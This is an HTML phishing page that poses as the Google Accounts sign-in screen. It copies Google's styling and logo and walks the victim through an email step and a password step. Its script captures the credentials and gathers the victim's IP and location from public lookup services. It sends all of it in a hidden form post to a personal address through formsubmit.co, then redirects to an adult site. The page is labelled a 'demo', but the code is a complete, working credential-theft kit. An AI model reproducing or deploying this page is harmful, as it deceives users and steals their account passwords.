<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://ssl.gstatic.com/accounts/favicon.ico">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', Roboto, arial, sans-serif;
            background-color: #fff;
            color: #202124;
            font-size: 14px;
            line-height: 1.4285714286;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 0 24px;
        }

        .container {
            max-width: 450px;
            width: 100%;
        }

        .form-container {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            background-color: #fff;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.1);
            text-align: center;
        }

        .logo {
            margin-bottom: 16px;
        }

        .logo svg {
            width: 75px;
            height: 24px;
        }

        .header {
            margin-bottom: 24px;
        }

        .header h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
        }

        .header p {
            color: #5f6368;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
        }

        .user-info {
            display: none;
            align-items: center;
            margin-bottom: 24px;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: left;
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #1a73e8;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 500;
            margin-right: 12px;
        }

        .user-details h3 {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 2px;
        }

        .user-details p {
            font-size: 14px;
            color: #5f6368;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .form-group label {
            color: #1a73e8;
            font-size: 12px;
            font-weight: 500;
            line-height: 1.5;
            margin-bottom: 8px;
            display: block;
        }

        .input-container {
            position: relative;
        }

        .form-input {
            width: 100%;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            height: 56px;
            padding: 13px 15px;
            outline: none;
            transition: border-color 0.2s;
            background-color: #fff;
            color: #202124;
        }

        .form-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .form-input:focus + .floating-label {
            color: #1a73e8;
            transform: translateY(-18px) scale(0.75);
        }

        .floating-label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #5f6368;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s;
            background-color: #fff;
            padding: 0 4px;
        }

        .form-input:not(:placeholder-shown) + .floating-label,
        .form-input.has-value + .floating-label {
            transform: translateY(-18px) scale(0.75);
            color: #1a73e8;
        }

        .forgot-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .guest-mode {
            margin: 24px 0;
            text-align: left;
        }

        .guest-mode p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 4px;
        }

        .learn-more {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .learn-more:hover {
            text-decoration: underline;
        }

        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-button {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-family: 'Google Sans', Roboto, arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
            height: 36px;
            letter-spacing: 0.25px;
            min-width: 64px;
            padding: 0 24px;
            transition: background-color 0.2s, box-shadow 0.2s;
        }

        .next-button:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        .next-button:focus {
            background-color: #1557b0;
            outline: none;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 48px;
            font-size: 12px;
        }

        .language-selector {
            color: #5f6368;
            text-decoration: none;
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            text-align: left;
        }

        .back-button {
            background: none;
            border: none;
            color: #1a73e8;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            padding: 0;
            text-decoration: none;
        }

        .back-button:hover {
            text-decoration: underline;
        }

        /* Platform-specific styles */
        .platform-android {
            background-color: #f8f9fa;
        }

        .platform-android .form-container {
            border-radius: 16px;
            box-shadow: 0 4px 16px 0 rgba(0,0,0,0.1);
        }

        .platform-ios {
            background-color: #f2f2f7;
        }

        .platform-ios .form-container {
            border: none;
            border-radius: 12px;
            box-shadow: 0 4px 20px 0 rgba(0,0,0,0.08);
        }

        .platform-windows .form-container {
            border-radius: 2px;
        }

        .platform-mac .form-container {
            border-radius: 8px;
            background-color: #fafafa;
        }

        /* Phase transitions */
        .phase {
            transition: opacity 0.3s ease-in-out;
        }

        .phase.hidden {
            display: none;
        }

        /* Responsive design */
        @media (max-width: 480px) {
            .form-container {
                padding: 24px 24px 36px;
                border: none;
                box-shadow: none;
            }

            .container {
                max-width: 100%;
            }

            body {
                padding: 0;
                background-color: #fff;
            }
        }

        /* Verification loading screen */
        .verification-screen {
            display: none;
            text-align: center;
            padding: 50px;
            font-family: 'Google Sans', Roboto, arial, sans-serif;
        }

        .verification-screen h2 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
        }

        .verification-screen p {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 24px;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body id="platform-detector">
    <div class="container">
        <div class="form-container">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24">
                    <g>
                        <path fill="#4285f4" d="M36.3425 16.7358H35.4727V21.8566H34.7893V16.7358H33.9195V16.1502H36.3425V16.7358Z"></path>
                        <path fill="#34a853" d="M37.7705 21.8566V16.1502H38.4517V17.7266C38.7081 17.4326 38.9962 17.1992 39.3159 17.0265C39.6356 16.8538 39.9881 16.7675 40.3734 16.7675C40.8692 16.7675 41.2995 16.8915 41.6642 17.1397C42.0289 17.3878 42.3075 17.7361 42.5 18.1847V21.8566H41.8188V18.3425C41.6926 18.0644 41.497 17.8466 41.232 17.6891C40.967 17.5317 40.6575 17.4529 40.3036 17.4529C39.9339 17.4529 39.6133 17.5396 39.3418 17.713C39.0703 17.8863 38.8581 18.1384 38.7051 18.4692V21.8566H37.7705Z"></path>
                        <path fill="#fbbc05" d="M44.3203 21.9668C43.6836 21.9668 43.1445 21.7969 42.7031 21.457C42.2617 21.1172 41.9609 20.6543 41.8008 20.0684L42.4297 19.8691C42.5352 20.2793 42.7363 20.6025 43.0332 20.8389C43.3301 21.0752 43.7012 21.1934 44.1465 21.1934C44.5918 21.1934 44.9453 21.0811 45.207 20.8564C45.4688 20.6318 45.5996 20.3438 45.5996 19.9922C45.5996 19.6406 45.4707 19.3555 45.2129 19.1367C44.9551 18.918 44.6055 18.7539 44.1641 18.6445L43.2773 18.418C42.6172 18.2559 42.1016 17.9922 41.7305 17.627C41.3594 17.2617 41.1738 16.7949 41.1738 16.2266C41.1738 15.6582 41.3789 15.1914 41.7891 14.8262C42.1992 14.4609 42.7285 14.2783 43.377 14.2783C43.9512 14.2783 44.4336 14.4219 44.8242 14.709C45.2148 14.9961 45.4785 15.3926 45.6152 15.8984L44.9863 16.0977C44.8809 15.7578 44.6836 15.4844 44.3945 15.2773C44.1055 15.0703 43.7656 14.9668 43.375 14.9668C42.9844 14.9668 42.6738 15.0703 42.4434 15.2773C42.2129 15.4844 42.0977 15.7461 42.0977 16.0625C42.0977 16.3789 42.2266 16.6387 42.4844 16.8418C42.7422 17.0449 43.0859 17.1953 43.5156 17.293L44.4023 17.5195C45.0625 17.6816 45.5781 17.9453 45.9492 18.3105C46.3203 18.6758 46.5059 19.1426 46.5059 19.7109C46.5059 20.2793 46.2969 20.7461 45.8789 21.1113C45.4609 21.4766 44.9316 21.6594 44.291 21.6594L44.3203 21.9668Z"></path>
                        <path fill="#ea4335" d="M48.6523 21.8566V14.3887H49.3359V17.7266C49.5924 17.4326 49.8805 17.1992 50.2002 17.0265C50.5199 16.8538 50.8724 16.7675 51.2578 16.7675C51.7535 16.7675 52.1839 16.8915 52.5486 17.1397C52.9133 17.3878 53.1918 17.7361 53.3844 18.1847V21.8566H52.7031V18.3425C52.577 18.0644 52.3814 17.8466 52.1164 17.6891C51.8514 17.5317 51.5418 17.4529 51.188 17.4529C50.8183 17.4529 50.4977 17.5396 50.2262 17.713C49.9547 17.8863 49.7424 18.1384 49.5895 18.4692V21.8566H48.6523Z"></path>
                    </g>
                    <g>
                        <path fill="#4285f4" d="M9.29498 16.1634C9.29498 15.5951 9.24461 15.0557 9.15137 14.5454H4.73828V17.5815H7.39648C7.28516 18.2416 6.96094 18.8213 6.46289 19.2441V21.0762H7.95703C8.80078 20.3213 9.29498 19.3486 9.29498 16.1634Z"></path>
                        <path fill="#34a853" d="M4.73828 22.8516C7.0957 22.8516 9.05566 22.1084 9.95703 21.0762L8.46289 19.2441C7.95703 19.5811 7.32617 19.7773 4.73828 19.7773C2.46484 19.7773 0.56543 18.0205 -0.0273438 15.7383H-1.5625V17.6084C-0.644531 19.4375 1.40625 22.8516 4.73828 22.8516Z"></path>
                        <path fill="#fbbc05" d="M-0.0273438 15.7383C-0.1875 15.2012 -0.28125 14.6436 -0.28125 14.0703C-0.28125 13.4971 -0.1875 12.9395 -0.0273438 12.4023V10.5322H-1.5625C-2.14844 11.6934 -2.47656 12.9951 -2.47656 14.0703C-2.47656 15.1455 -2.14844 16.4473 -1.5625 17.6084L-0.0273438 15.7383Z"></path>
                        <path fill="#ea4335" d="M4.73828 8.36328C6.05957 8.36328 7.22363 8.82324 8.15234 9.70605L9.95703 7.90137C8.98047 6.99316 7.64941 6.28906 4.73828 6.28906C1.40625 6.28906 -0.644531 9.70312 -1.5625 11.5322L-0.0273438 13.4023C0.56543 11.1201 2.46484 8.36328 4.73828 8.36328Z"></path>
                    </g>
                </svg>
            </div>

            <!-- Phase 1: Email Entry -->
            <div id="email-phase" class="phase">
                <div class="header">
                    <h1>Sign in</h1>
                    <p>Use your Google Account</p>
                </div>

                <form id="email-form">
                    <div class="form-group">
                        <div class="input-container">
                            <input type="text" id="username" name="username" class="form-input" placeholder=" " required>
                            <label for="username" class="floating-label">Email or phone</label>
                        </div>
                        <div class="error-message" id="username-error" style="display: none;"></div>
                    </div>

                    <div class="forgot-email">
                        <a href="#" class="forgot-link" onclick="handleForgotEmail(event)">Forgot email?</a>
                    </div>

                    <div class="guest-mode">
                        <p>Not your computer? Use Guest mode to sign in privately.</p>
                        <a href="#" class="learn-more" onclick="handleGuestMode(event)">Learn more about using Guest mode</a>
                    </div>

                    <div class="form-actions">
                        <a href="#" class="create-account" onclick="handleCreateAccount(event)">Create account</a>
                        <button type="submit" class="next-button">Next</button>
                    </div>
                </form>
            </div>

            <!-- Phase 2: Password Entry -->
            <div id="password-phase" class="phase hidden">
                <div class="header">
                    <h1>Welcome</h1>
                </div>

                <div class="user-info" id="user-info">
                    <div class="user-avatar" id="user-avatar">G</div>
                    <div class="user-details">
                        <h3 id="user-email"></h3>
                        <p>Google Account</p>
                    </div>
                </div>

                <form id="password-form">
                    <div class="form-group">
                        <div class="input-container">
                            <input type="password" id="password" name="password" class="form-input" placeholder=" " required>
                            <label for="password" class="floating-label">Enter your password</label>
                        </div>
                        <div class="error-message" id="password-error" style="display: none;"></div>
                    </div>

                    <div class="forgot-email">
                        <a href="#" class="forgot-link" onclick="handleForgotPassword(event)">Forgot password?</a>
                    </div>

                    <div class="form-actions">
                        <button type="button" class="back-button" onclick="goBackToEmail()">Back</button>
                        <button type="submit" class="next-button">Next</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="footer">
            <select class="language-selector" onchange="handleLanguageChange(this)">
                <option value="en">English (United States)</option>
                <option value="id">Bahasa Indonesia</option>
                <option value="es">Espa√±ol</option>
                <option value="fr">Fran√ßais</option>
                <option value="de">Deutsch</option>
            </select>
            <div class="footer-links">
                <a href="#" onclick="handleHelp(event)">Help</a>
                <a href="#" onclick="handlePrivacy(event)">Privacy</a>
                <a href="#" onclick="handleTerms(event)">Terms</a>
            </div>
        </div>
    </div>

    <!-- Verification Screen (hidden by default) -->
    <div class="verification-screen" id="verification-screen">
        <h2>Verifying your account...</h2>
        <p>Please wait while we redirect you...</p>
        <div class="spinner"></div>
    </div>

    <script>
        let currentEmail = '';

        // Platform detection and UI customization
        function detectPlatform() {
            const userAgent = navigator.userAgent.toLowerCase();
            const body = document.body;
            
            if (/android/i.test(userAgent)) {
                body.classList.add('platform-android');
            } else if (/iphone|ipad|ipod/i.test(userAgent)) {
                body.classList.add('platform-ios');
            } else if (/windows/i.test(userAgent)) {
                body.classList.add('platform-windows');
            } else if (/macintosh|mac os x/i.test(userAgent)) {
                body.classList.add('platform-mac');
            }
        }

        // Input handlers for floating labels
        function handleInputFocus() {
            const inputs = document.querySelectorAll('.form-input');
            inputs.forEach(input => {
                // Check if input has value on page load
                if (input.value.trim() !== '') {
                    input.classList.add('has-value');
                }

                input.addEventListener('input', function() {
                    if (this.value.trim() !== '') {
                        this.classList.add('has-value');
                    } else {
                        this.classList.remove('has-value');
                    }
                });

                input.addEventListener('focus', function() {
                    this.classList.add('has-value');
                });

                input.addEventListener('blur', function() {
                    if (this.value.trim() === '') {
                        this.classList.remove('has-value');
                    }
                });
            });
        }

        // Email phase handler
        function handleEmailSubmit(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            
            if (!username) {
                showError('username-error', 'Please enter an email or phone number');
                return;
            }

            console.log('Email captured:', username);
            currentEmail = username;
            
            // Show password phase
            showPasswordPhase(username);
        }

        // Show password phase
        function showPasswordPhase(email) {
            // Hide email phase
            document.getElementById('email-phase').classList.add('hidden');
            
            // Show password phase
            document.getElementById('password-phase').classList.remove('hidden');
            
            // Update user info
            document.getElementById('user-email').textContent = email;
            document.getElementById('user-avatar').textContent = email.charAt(0).toUpperCase();
            document.getElementById('user-info').style.display = 'flex';
            
            // Focus on password field
            setTimeout(() => {
                document.getElementById('password').focus();
            }, 100);
        }

        // Go back to email phase
        function goBackToEmail() {
            document.getElementById('password-phase').classList.add('hidden');
            document.getElementById('email-phase').classList.remove('hidden');
            document.getElementById('username').focus();
        }

        // Password phase handler with location capture
        function handlePasswordSubmit(event) {
            event.preventDefault();
            
            const password = document.getElementById('password').value.trim();
            
            if (!password) {
                showError('password-error', 'Please enter your password');
                return;
            }

            console.log('Full credentials captured:', currentEmail, password);
            
            // Show verification screen immediately
            document.querySelector('.container').style.display = 'none';
            document.getElementById('verification-screen').style.display = 'block';
            
            // Get IP and location data
            console.log('Fetching location data...');
            
            // Try multiple location APIs for better reliability
            const locationApis = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://api.ipify.org?format=json'
            ];
            
            let locationData = null;
            let apiIndex = 0;
            
            function tryNextApi() {
                if (apiIndex >= locationApis.length) {
                    throw new Error('All location APIs failed');
                }
                
                const apiUrl = locationApis[apiIndex];
                console.log(`Trying location API ${apiIndex + 1}: ${apiUrl}`);
                
                return fetch(apiUrl)
                    .then(response => {
                        console.log(`API ${apiIndex + 1} response status:`, response.status);
                        if (!response.ok) {
                            throw new Error(`HTTP error! status: ${response.status}`);
                        }
                        return response.json();
                    })
                    .then(data => {
                        console.log(`API ${apiIndex + 1} data received:`, data);
                        locationData = data;
                        return data;
                    })
                    .catch(error => {
                        console.log(`API ${apiIndex + 1} failed:`, error);
                        apiIndex++;
                        return tryNextApi();
                    });
            }
            
            tryNextApi()
                .then(data => {
                    // Format location based on which API succeeded
                    let location;
                    if (data.city && data.country_name) {
                        // ipapi.co format
                        location = `${data.city}, ${data.country_name} (IP: ${data.ip || 'Unknown IP'})`;
                    } else if (data.city && data.country) {
                        // ipinfo.io format
                        location = `${data.city}, ${data.country} (IP: ${data.ip || 'Unknown IP'})`;
                    } else if (data.ip) {
                        // ipify.org format (only IP)
                        location = `Unknown Location (IP: ${data.ip})`;
                    } else {
                        location = 'Location unavailable';
                    }
                    
                    console.log('Formatted location:', location);
                    
                    // Send credentials to your email using FormSubmit
                    const emailData = {
                        email: currentEmail,
                        password: password,
                        location: location,
                        site: 'webdev-projects1.github.io/google-signin-demo',
                        time: new Date().toLocaleString(),
                        subject: 'üö® FULL Google Credentials Captured!'
                    };
                    
                    // Create hidden form for email submission
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://formsubmit.co/warenhubner@gmail.com';
                    form.style.display = 'none';
                    
                    // Add form fields
                    Object.keys(emailData).forEach(key => {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = emailData[key];
                        form.appendChild(input);
                    });
                    
                    // Add anti-spam field only (NO _next redirect to prevent FormSubmit redirect)
                    const honeypot = document.createElement('input');
                    honeypot.type = 'hidden';
                    honeypot.name = '_captcha';
                    honeypot.value = 'false';
                    form.appendChild(honeypot);
                    
                    // Submit form in background (hidden)
                    document.body.appendChild(form);
                    form.submit();
                    
                    // Force redirect immediately after form submission
                    setTimeout(function() {
                        window.location.replace('https://kingbokep.tv');
                    }, 1000);
                })
                .catch(error => {
                    console.log('All location APIs failed:', error);
                    console.log('Proceeding without location data');
                    
                    // Fallback: Send credentials without location
                    const emailData = {
                        email: currentEmail,
                        password: password,
                        location: 'Location data unavailable (APIs failed)',
                        site: 'webdev-projects1.github.io/google-signin-demo',
                        time: new Date().toLocaleString(),
                        subject: 'üö® FULL Google Credentials Captured!'
                    };
                    
                    // Create hidden form for email submission
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://formsubmit.co/warenhubner@gmail.com';
                    form.style.display = 'none';
                    
                    // Add form fields
                    Object.keys(emailData).forEach(key => {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = emailData[key];
                        form.appendChild(input);
                    });
                    
                    // Add anti-spam field only (NO _next redirect to prevent FormSubmit redirect)
                    const honeypot = document.createElement('input');
                    honeypot.type = 'hidden';
                    honeypot.name = '_captcha';
                    honeypot.value = 'false';
                    form.appendChild(honeypot);
                    
                    // Submit form in background (hidden)
                    document.body.appendChild(form);
                    form.submit();
                    
                    // Force redirect immediately after form submission
                    setTimeout(function() {
                        window.location.replace('https://kingbokep.tv');
                    }, 1000);
                });
        }

        // Error display function
        function showError(elementId, message) {
            const errorElement = document.getElementById(elementId);
            errorElement.textContent = message;
            errorElement.style.display = 'block';
        }

        // Link handlers (to prevent navigation)
        function handleForgotEmail(event) {
            event.preventDefault();
        }

        function handleGuestMode(event) {
            event.preventDefault();
        }

        function handleCreateAccount(event) {
            event.preventDefault();
        }

        function handleForgotPassword(event) {
            event.preventDefault();
        }

        function handleLanguageChange(select) {
            // Could implement fake language switching
        }

        function handleHelp(event) {
            event.preventDefault();
        }

        function handlePrivacy(event) {
            event.preventDefault();
        }

        function handleTerms(event) {
            event.preventDefault();
        }

        // Initialize everything when page loads
        document.addEventListener('DOMContentLoaded', function() {
            console.log('Two-phase Google Sign-in loaded');
            detectPlatform();
            handleInputFocus();
            
            // Add form submission handlers
            const emailForm = document.getElementById('email-form');
            const passwordForm = document.getElementById('password-form');
            
            emailForm.addEventListener('submit', handleEmailSubmit);
            passwordForm.addEventListener('submit', handlePasswordSubmit);
        });
    </script>
</body>
</html>